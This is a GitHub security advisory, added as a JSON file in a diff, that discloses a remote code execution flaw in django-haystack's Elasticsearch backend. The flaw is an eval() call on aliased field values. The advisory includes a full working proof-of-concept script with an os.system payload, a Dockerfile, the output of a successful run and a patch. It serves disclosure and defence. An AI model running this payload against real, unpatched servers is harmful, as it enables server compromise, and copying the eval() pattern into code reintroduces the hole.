@@ -1,0 +1,99 @@
+{
+  "id": "GHSA-r3hx-x5rh-p9vv",
+  "modified": "2026-07-15T22:45:41.272388040Z",
+  "published": "2026-07-15T22:42:28Z",
+  "summary": "django-haystack: Remote Code Execution via `eval()` in Elasticsearch Result Deserialization",
+  "details": "## Remote Code Execution via `eval()` in Elasticsearch Result Deserialization\n\n### Summary\n\nThe Elasticsearch backend in django-haystack calls `eval()` on raw field values returned from Elasticsearch when a `SearchField` is declared with an `index_fieldname` alias that differs from the logical field name. During result processing, the backend looks up fields by logical name but Elasticsearch stores them under the alias key; the lookup fails and the value falls through to `_to_python()` → `eval()`. An attacker who can control content that is indexed into Elasticsearch—and can trigger or wait for a search that returns it—achieves arbitrary code execution in the Django application process. CVSS 3.1 Base Score: **8.5 (High)**.\n\n### Details\n\n**Sink — `haystack/backends/elasticsearch_backend.py:865`:**\n\n```python\nconverted_value = eval(value)\n```\n\n`_to_python()` (line ~850) attempts to parse a string value by calling `eval()` before performing any type-safety check. If the value is an attacker-controlled Python expression such as `__import__('os').system(...)`, the expression is executed unconditionally.\n\n**Root cause — `haystack/backends/elasticsearch_backend.py:727–737`:**\n\n```python\nfor key, value in source.items():\n    string_key = str(key)\n\n    if string_key in index.fields and hasattr(index.fields[string_key], \"convert\"):\n        additional_fields[string_key] = index.fields[string_key].convert(value)\n    else:\n        additional_fields[string_key] = self._to_python(value)\n```\n\n`index.fields` is keyed by the *logical* field name (e.g. `\"name\"`), but Elasticsearch stores the document under the `index_fieldname` alias (e.g. `\"name_s\"`). Because `\"name_s\" not in index.fields`, the branch falls through to `self._to_python(value)`.\n\n**Data flow (source → sink):**\n\n1. `haystack/indexes.py:226` — `self.prepared_data[field.index_fieldname] = field.prepare(obj)` stores data under the alias.\n2. `haystack/backends/elasticsearch_backend.py:218` — prepared data copied into `final_data`.\n3. `haystack/backends/elasticsearch_backend.py:236` — `bulk(...)` writes the document to Elasticsearch under the alias key.\n4. `haystack/backends/elasticsearch_backend.py:574` — search reads attacker-influenced `_source` back from Elasticsearch.\n5. `haystack/backends/elasticsearch_backend.py:720` — `_process_results()` takes `raw_result[\"_source\"]`.\n6. `haystack/backends/elasticsearch_backend.py:730` — lookup `string_key in index.fields` fails for alias keys.\n7. `haystack/backends/elasticsearch_backend.py:737` — unmatched value passed to `_to_python(value)`.\n8. `haystack/backends/elasticsearch_backend.py:865` — **sink**: `converted_value = eval(value)`.\n\n**Missing fix:** The Solr backend correctly remaps aliases at `haystack/backends/solr_backend.py:535–539` using `index.field_map` before performing the `index.fields` lookup. The Elasticsearch backend has no equivalent remapping.\n\n**Preconditions:**\n\n- The application uses the Elasticsearch backend.\n- At least one `SearchField` in a `SearchIndex` is declared with `index_fieldname` set to a value different from the logical attribute name.\n- The attacker can write content that is indexed (e.g. via a form, API, or any user-controlled field included in the index).\n- The attacker can trigger or wait for a search that returns the malicious document.\n\n### PoC\n\n**Environment setup (Docker):**\n\n```bash\n# Build the proof-of-concept image\ndocker build -t vuln001-poc \\\n  -f /path/to/vuln-001/Dockerfile \\\n  /path/to/reports/pypiAi_436_django-haystack__django-haystack/\n\n# Run the PoC — exits 0 on confirmed RCE\ndocker run --rm vuln001-poc\n```\n\n**Dockerfile** (`vuln-001/Dockerfile`):\n\n```dockerfile\nFROM python:3.11-slim\nWORKDIR /app\nRUN pip install --no-cache-dir setuptools setuptools_scm wheel\nCOPY repo/ /app/repo/\nRUN pip install --no-cache-dir \"Django\u003e=4.2\" \"elasticsearch\u003e=5,\u003c8\"\nRUN SETUPTOOLS_SCM_PRETEND_VERSION=0.0.dev0 pip install --no-cache-dir -e /app/repo/\nCOPY vuln-001/poc.py /app/poc.py\nCMD [\"python3\", \"/app/poc.py\"]\n```\n\n**PoC script** (`vuln-001/poc.py`) — key sections:\n\n```python\n# SearchField with index_fieldname alias\nclass MockField:\n    index_fieldname = \"name_s\"   # ES key\n    def convert(self, value): return str(value)\n\nclass MockIndex:\n    fields = {\"name\": MockField()}   # logical key — \"name_s\" NOT present\n    field_map = {\"name_s\": \"name\"}\n\n# Malicious payload placed in the alias key of a crafted ES _source response\nMARKER_FILE = \"/tmp/django_haystack_eval_rce_proof\"\npayload = (\n    f\"__import__('os').system(\"\n    f\"'echo PWNED_BY_EVAL_RCE \u003e {MARKER_FILE}')\"\n)\n\nraw_results = {\"hits\": {\"total\": 1, \"hits\": [{\n    \"_score\": 1.0,\n    \"_source\": {\n        \"django_ct\": \"app.model\",\n        \"django_id\": \"1\",\n        \"name_s\": payload,   # alias key → lookup fails → eval()\n    },\n}]}}\n\nbackend._process_results(raw_results)\n# Confirms RCE: /tmp/django_haystack_eval_rce_proof contains \"PWNED_BY_EVAL_RCE\"\n```\n\n**Observed output (Phase 2 dynamic reproduction):**\n\n```\n============================================================\nVULN-001 PoC: eval() RCE in ElasticsearchSearchBackend\n============================================================\n[*] Payload : __import__('os').system('echo PWNED_BY_EVAL_RCE \u003e /tmp/django_haystack_eval_rce_proof')\n[*] Marker  : /tmp/django_haystack_eval_rce_proof\n[*] Sink    : elasticsearch_backend.py:865  eval(value)\n\n[+] SUCCESS: RCE CONFIRMED\n[+] Marker file created: /tmp/django_haystack_eval_rce_proof\n[+] File content: PWNED_BY_EVAL_RCE\n\nRESULT: PASS - VULN-001 is dynamically reproduced and exploitable\n```\n\n**Recommended remediation:**\n\n```diff\n--- a/haystack/backends/elasticsearch_backend.py\n+++ b/haystack/backends/elasticsearch_backend.py\n-import re\n+import ast\n+import re\n \n             index = source and unified_index.get_index(model)\n+            index_field_map = index.field_map\n             for key, value in source.items():\n                 string_key = str(key)\n+                if string_key in index_field_map:\n+                    string_key = index_field_map[string_key]\n \n                 if string_key in index.fields and hasattr(\n                     index.fields[string_key], \"convert\"\n \n-            converted_value = eval(value)\n+            converted_value = ast.literal_eval(value)\n```\n\n### Impact\n\nThis is a **Remote Code Execution (RCE)** vulnerability. Any attacker who can submit content that is stored and indexed in Elasticsearch—then retrieved via a search—can execute arbitrary Python (and shell) commands in the Django application process with the privileges of the web server. Full confidentiality, integrity, and availability of the server are at risk. Because Haystack is a reusable search library, the vulnerability affects all Django applications that use the Elasticsearch backend with `index_fieldname` aliasing, regardless of how authentication is configured by the application.\n\n### Reproduction artifacts\n\n#### `Dockerfile`\n\n```dockerfile\nFROM python:3.11-slim\n\nWORKDIR /app\n\n# Install build tools needed for setuptools_scm\nRUN pip install --no-cache-dir setuptools setuptools_scm wheel\n\n# Copy the django-haystack repository source\nCOPY repo/ /app/repo/\n\n# Install Django and the elasticsearch client\nRUN pip install --no-cache-dir \"Django\u003e=4.2\" \"elasticsearch\u003e=5,\u003c8\"\n\n# Install django-haystack from the local repo (editable install)\n# setuptools_scm requires git metadata; use fallback version instead\nRUN SETUPTOOLS_SCM_PRETEND_VERSION=0.0.dev0 pip install --no-cache-dir -e /app/repo/\n\n# Copy the PoC script\nCOPY vuln-001/poc.py /app/poc.py\n\n# Run the PoC by default\nCMD [\"python3\", \"/app/poc.py\"]\n```\n\n#### `poc.py`\n\n```python\n\"\"\"\nPoC for VULN-001: Arbitrary Code Execution via eval() in\nElasticsearchSearchBackend._process_results (django-haystack)\n\nVulnerability:\n    haystack/backends/elasticsearch_backend.py:865 calls eval(value) on\n    Elasticsearch _source field values that do not match any entry in\n    index.fields. This mismatch occurs when a SearchField uses\n    index_fieldname (alias) different from its logical field name: ES stores\n    data under the alias, but the backend looks up fields by logical name,\n    causing unmatched values to fall through to _to_python() -\u003e eval().\n\nAttack path:\n    1. Attacker controls content that is indexed into Elasticsearch.\n    2. The Django app has a SearchIndex field with index_fieldname alias.\n    3. ES stores the document under the alias key.\n    4. On search, _process_results reads _source where the alias key is NOT\n       found in index.fields (which uses logical names).\n    5. The value routes to _to_python(value) -\u003e eval(value) -\u003e RCE.\n\nThis PoC bypasses the need for a live Elasticsearch instance by directly\ncalling _process_results() with a crafted raw result dict.\n\"\"\"\n\nimport os\nimport sys\n\n# ---------------------------------------------------------------------------\n# 1. Configure Django (no database required)\n# ---------------------------------------------------------------------------\nfrom django.conf import settings\n\nif not settings.configured:\n    settings.configure(\n        SECRET_KEY=\"poc-only-not-for-production\",\n        INSTALLED_APPS=[\n            \"django.contrib.contenttypes\",\n            \"django.contrib.auth\",\n            \"haystack\",\n        ],\n        HAYSTACK_CONNECTIONS={\n            \"default\": {\n                \"ENGINE\": \"haystack.backends.elasticsearch_backend.ElasticsearchSearchEngine\",\n                \"URL\": \"http://127.0.0.1:9200/\",\n                \"INDEX_NAME\": \"poc_index\",\n            }\n        },\n        DATABASES={},\n    )\n\nimport haystack\nimport haystack.backends.elasticsearch_backend as esb\n\n# ---------------------------------------------------------------------------\n# 2. Mock objects to simulate the Haystack/ES environment\n# ---------------------------------------------------------------------------\n\nclass MockField:\n    \"\"\"\n    Simulates a SearchField declared with an index_fieldname alias.\n    Logical field name: \"name\"\n    ES storage key (index_fieldname): \"name_s\"\n    \"\"\"\n    index_fieldname = \"name_s\"\n\n    def convert(self, value):\n        return str(value)\n\n\nclass MockIndex:\n    \"\"\"\n    Simulates a SearchIndex.\n    fields: keyed by LOGICAL name (\"name\")\n    field_map: alias -\u003e logical name  (Solr uses this; ES backend does NOT)\n    \"\"\"\n    fields = {\n        \"name\": MockField(),\n    }\n    field_map = {\"name_s\": \"name\"}\n\n\nclass MockUnifiedIndex:\n    document_field = \"text\"\n\n    def get_indexed_models(self):\n        return [object]\n\n    def get_index(self, model):\n        return MockIndex()\n\n\nclass MockConnection:\n    def get_unified_index(self):\n        return MockUnifiedIndex()\n\n\n# Patch the global haystack connections registry so _process_results can\n# look up the unified index without a real Elasticsearch connection.\nhaystack.connections = {\"default\": MockConnection()}\n\n# Patch the model-lookup helper used inside _process_results.\n# Returns `object` so the model is found and the result is processed.\nesb.haystack_get_model = lambda app_label, model_name: object\n\n# ---------------------------------------------------------------------------\n# 3. Build the malicious payload\n# ---------------------------------------------------------------------------\nMARKER_FILE = \"/tmp/django_haystack_eval_rce_proof\"\n\n# os.system() returns the exit code (int). The isinstance(int) check in\n# _to_python() passes, so eval() completes without raising, confirming\n# full expression execution. The shell command writes the proof file.\npayload = (\n    f\"__import__('os').system(\"\n    f\"'echo PWNED_BY_EVAL_RCE \u003e {MARKER_FILE}')\"\n)\n\n# Crafted Elasticsearch raw response:\n#   \"name_s\" is the index_fieldname alias stored in ES.\n#   \"name\" is the logical field name present in index.fields.\n#   Because \"name_s\" != \"name\", the lookup fails and value goes to eval().\nraw_results = {\n    \"hits\": {\n        \"total\": 1,\n        \"hits\": [\n            {\n                \"_score\": 1.0,\n                \"_source\": {\n                    \"django_ct\": \"app.model\",   # required sentinel field\n                    \"django_id\": \"1\",           # required sentinel field\n                    \"name_s\": payload,          # alias key -\u003e eval() path\n                },\n            }\n        ],\n    }\n}\n\n# ---------------------------------------------------------------------------\n# 4. Instantiate the backend without __init__ (no live ES connection needed)\n# ---------------------------------------------------------------------------\nbackend = esb.ElasticsearchSearchBackend.__new__(esb.ElasticsearchSearchBackend)\nbackend.connection_alias = \"default\"\nbackend.include_spelling = False\n\n# ---------------------------------------------------------------------------\n# 5. Trigger the vulnerability\n# ---------------------------------------------------------------------------\nprint(\"=\" * 60)\nprint(\"VULN-001 PoC: eval() RCE in ElasticsearchSearchBackend\")\nprint(\"=\" * 60)\nprint(f\"[*] Payload : {payload}\")\nprint(f\"[*] Marker  : {MARKER_FILE}\")\nprint(f\"[*] Sink    : elasticsearch_backend.py:865  eval(value)\")\nprint()\n\n# Remove any leftover marker from a previous run\nif os.path.exists(MARKER_FILE):\n    os.remove(MARKER_FILE)\n\ntry:\n    backend._process_results(raw_results)\nexcept Exception as exc:\n    # An exception here does not mean eval() was not called;\n    # the side effect (file write) is the ground truth.\n    print(f\"[!] _process_results raised (checking side effects anyway): {exc}\")\n\n# ---------------------------------------------------------------------------\n# 6. Verify the side effect\n# ---------------------------------------------------------------------------\nprint()\nif os.path.exists(MARKER_FILE):\n    content = open(MARKER_FILE).read().strip()\n    print(\"[+] SUCCESS: RCE CONFIRMED\")\n    print(f\"[+] Marker file created: {MARKER_FILE}\")\n    print(f\"[+] File content: {content}\")\n    print()\n    print(\"RESULT: PASS - VULN-001 is dynamically reproduced and exploitable\")\n    sys.exit(0)\nelse:\n    print(\"[-] FAILURE: Marker file was not created\")\n    print(\"[-] eval() was not triggered or the payload did not execute\")\n    print()\n    print(\"RESULT: FAIL - RCE could not be confirmed\")\n    sys.exit(1)\n```",
+  "affected": [
+    {
+      "package": {
+        "ecosystem": "PyPI",
+        "name": "django-haystack",
+        "purl": "pkg:pypi/django-haystack"
+      },
+      "ranges": [
+        {
+          "type": "ECOSYSTEM",
+          "events": [
+            {
+              "introduced": "0"
+            },
+            {
+              "fixed": "3.4.0"
+            }
+          ]
+        }
+      ],
+      "versions": [
+        "1.0.0-final",
+        "1.0.0-rc1",
+        "1.0.0b",
+        "1.0.1-final",
+        "1.0.2-final",
+        "1.1.0",
+        "1.2.0",
+        "1.2.1",
+        "1.2.2",
+        "1.2.3",
+        "1.2.4",
+        "1.2.5",
+        "1.2.6",
+        "1.2.7",
+        "2.0.0",
+        "2.1.0",
+        "2.2.0",
+        "2.2.1",
+        "2.3.0",
+        "2.3.1",
+        "2.3.2",
+        "2.4.0",
+        "2.4.0rc1",
+        "2.4.0rc2",
+        "2.4.1",
+        "2.5.0",
+        "2.5.1",
+        "2.5.dev0",
+        "2.5.dev1",
+        "2.5.dev2",
+        "2.6.0",
+        "2.6.1",
+        "2.7.0",
+        "2.7.dev0",
+        "2.7.dev1",
+        "2.8.0",
+        "2.8.1",
+        "3.0",
+        "3.0b1",
+        "3.0b2",
+        "3.1.0",
+        "3.1.1",
+        "3.2.0",
+        "3.2.1",
+        "3.2.dev0",
+        "3.3.0",
+        "3.3b2"
+      ],
+      "database_specific": {
+        "source": "https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2026/07/GHSA-r3hx-x5rh-p9vv/GHSA-r3hx-x5rh-p9vv.json"
+      }
+    }
+  ],
+  "references": [
+    {
+      "type": "WEB",
+      "url": "https://github.com/django-haystack/django-haystack/security/advisories/GHSA-r3hx-x5rh-p9vv"
+    },
+    {
+      "type": "WEB",
+      "url": "https://github.com/django-haystack/django-haystack/commit/eb05f193c9771a68dcc8cfac6674a0d48a52ee9d"
+    },
+    {
+      "type": "PACKAGE",
+      "url": "https://github.com/django-haystack/django-haystack"
+    },
+    {
+      "type": "WEB",
+      "url": "https://github.com/django-haystack/django-haystack/releases/tag/v3.4.0"
+    }
+  ]
+}
